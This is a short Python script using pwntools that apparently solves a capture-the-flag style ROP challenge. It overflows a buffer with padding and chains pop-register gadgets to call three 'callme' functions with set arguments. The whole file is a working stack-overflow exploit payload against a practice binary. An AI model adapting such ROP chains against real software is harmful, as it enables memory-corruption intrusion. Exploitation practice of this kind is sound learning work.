import pwn

junk = "A"*40

callme1 = pwn.p64(0x0000000000401850)

callme2 = pwn.p64(0x0000000000401870)

callme3 = pwn.p64(0x0000000000401810)

pop_rdi = pwn.p64(0x0000000000401b23) # rdi 1. arg

pop_rsi = pwn.p64(0x0000000000401b21) # rsi 2. arg

pop_rdx = pwn.p64(0x0000000000401ab2) # rdx 3. arg

one = pwn.p64(0x1)
two = pwn.p64(0x2)
three = pwn.p64(0x3)


# RDI, RSI, RDX
print junk + pop_rdi  + one + pop_rsi + two + "CCCCCCCC" + pop_rdx + three +  callme1 + pop_rdi  + one + pop_rsi + two + "CCCCCCCC" + pop_rdx + three +  callme2 + pop_rdi  + one + pop_rsi + two + "CCCCCCCC" + pop_rdx + three + callme3 
